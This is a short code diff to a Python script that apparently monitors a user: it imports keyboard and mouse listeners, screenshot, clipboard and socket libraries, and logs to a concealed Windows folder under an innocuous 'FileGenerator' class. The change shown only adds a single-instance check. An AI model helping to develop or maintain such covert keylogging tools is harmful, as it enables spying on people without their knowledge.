@@ -5,6 +5,7 @@ import socket
 import time
 import pyscreenshot
 import pyperclip
+import psutil
 from pynput import keyboard
 from pynput.keyboard import Listener
 import threading
@@ -13,6 +14,16 @@ import threading
 output_directory = "C:\\Windows\\klm\\output"
 log_directory = "C:\\Windows\\klm\\logs"
 logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+
+def check_if_already_running():
+    current_script = os.path.basename(__file__)  # Gets the name of the current script
+    for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+        # Check if this script is part of the cmdline of any running processes
+        if proc.info['cmdline'] and current_script in ' '.join(proc.info['cmdline']):
+            if proc.pid != os.getpid():
+                # If the script name is found and it's not this process, it's already running
+                return True
+    return False
 
 class FileGenerator:
     def __init__(self):
@@ -121,5 +132,8 @@ class FileGenerator:
         mouse_listener.start()
 
 if __name__ == "__main__":
+    if check_if_already_running():
+        logging.error("Another instance of the script is already running.")
+        sys.exit("Another instance of the script is already running.")
     file_generator = FileGenerator()
     file_generator.run()
